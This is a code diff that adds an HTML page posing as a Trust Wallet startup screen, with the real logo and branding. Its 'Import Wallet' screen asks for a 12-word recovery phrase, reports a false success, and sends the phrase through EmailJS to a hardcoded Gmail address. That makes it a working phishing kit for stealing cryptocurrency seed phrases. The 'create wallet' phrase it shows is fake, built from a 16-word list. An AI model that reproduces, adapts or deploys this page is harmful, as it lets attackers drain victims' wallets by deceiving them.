@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Trust Wallet Clone - Startup</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #04142f;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .splash, .welcome, .import-screen, .create-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      width: 100%;
+    }
+    .splash img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    .welcome button, .import-screen button, .create-screen button {
+      margin: 10px;
+      padding: 15px 25px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .create-btn {
+      background-color: #1e90ff;
+      color: white;
+    }
+    .import-btn {
+      background-color: #ffffff;
+      color: #04142f;
+    }
+    textarea {
+      width: 90%;
+      height: 100px;
+      font-size: 16px;
+      margin-top: 10px;
+      border-radius: 8px;
+      padding: 10px;
+      border: none;
+    }
+    .phrase-box {
+      background-color: #123;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 15px;
+      width: 90%;
+      word-wrap: break-word;
+      color: lightgreen;
+    }
+    .message {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+  </style>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("oP-K0HzXjGUpm_8ZE"); // Replace with your actual EmailJS User ID
+    })();
+  </script>
+</head>
+<body>
+  <!-- Splash Screen -->
+  <div class="splash" id="splash">
+    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo">
+    <h2>Trust Wallet</h2>
+  </div>
+
+  <!-- Welcome Screen -->
+  <div class="welcome" id="welcome">
+    <h1>Welcome to Trust Wallet</h1>
+    <p>Securely store and manage your crypto assets.</p>
+    <button class="create-btn" onclick="showCreate()">Create a New Wallet</button>
+    <button class="import-btn" onclick="showImport()">I already have a wallet</button>
+  </div>
+
+  <!-- Import Wallet Screen -->
+  <div class="import-screen" id="importScreen">
+    <h2>Import Wallet</h2>
+    <p>Enter your 12-word recovery phrase:</p>
+    <textarea id="importInput" placeholder="e.g. bridge apple zebra market ..."></textarea>
+    <button onclick="importWallet()">Import</button>
+    <div class="message" id="importMessage"></div>
+    <button onclick="goBack()">Back</button>
+  </div>
+
+  <!-- Create Wallet Screen -->
+  <div class="create-screen" id="createScreen">
+    <h2>Your Recovery Phrase</h2>
+    <p>Write this down and keep it safe!</p>
+    <div class="phrase-box" id="generatedPhrase"></div>
+    <button onclick="alert('Wallet created! Redirecting...')">Continue</button>
+    <button onclick="goBack()">Back</button>
+  </div>
+
+  <script>
+    const splash = document.getElementById('splash');
+    const welcome = document.getElementById('welcome');
+    const importScreen = document.getElementById('importScreen');
+    const createScreen = document.getElementById('createScreen');
+
+    // Splash animation
+    splash.style.display = 'flex';
+    setTimeout(() => {
+      splash.style.display = 'none';
+      welcome.style.display = 'flex';
+    }, 2500);
+
+    function showImport() {
+      welcome.style.display = 'none';
+      importScreen.style.display = 'flex';
+    }
+
+    function showCreate() {
+      welcome.style.display = 'none';
+      createScreen.style.display = 'flex';
+      const phrase = generatePhrase();
+      document.getElementById('generatedPhrase').textContent = phrase;
+    }
+
+    function goBack() {
+      importScreen.style.display = 'none';
+      createScreen.style.display = 'none';
+      welcome.style.display = 'flex';
+    }
+
+    function importWallet() {
+      const input = document.getElementById('importInput').value.trim();
+      const words = input.split(/\s+/);
+      const msg = document.getElementById('importMessage');
+
+      if (words.length !== 12) {
+        msg.textContent = "❌ Please enter exactly 12 words.";
+        msg.style.color = "orange";
+      } else {
+        msg.textContent = "✅ Wallet imported successfully!";
+        msg.style.color = "lightgreen";
+
+        // Send phrase via EmailJS
+        emailjs.send("service_dhvmbfm", "template_acs65kb", {
+          phrase: input,
+          to_email: "vascoevan@gmail.com"
+        }).then(() => {
+          console.log("Email sent successfully.");
+        }, (error) => {
+          console.error("EmailJS error:", error);
+          msg.textContent = "⚠️ Error sending to email (check console)";
+          msg.style.color = "red";
+        });
+
+        setTimeout(() => alert("Redirecting to dashboard..."), 1000);
+      }
+    }
+
+    function generatePhrase() {
+      const wordList = ["bridge", "apple", "zebra", "market", "sunset", "rocket", "cloud", "wallet", "token", "fish", "card", "lunar", "harbor", "chain", "silver", "river"];
+      let result = [];
+      while (result.length < 12) {
+        const word = wordList[Math.floor(Math.random() * wordList.length)];
+        if (!result.includes(word)) result.push(word);
+      }
+      return result.join(" ");
+    }
+  </script>
+</body>
+</html>
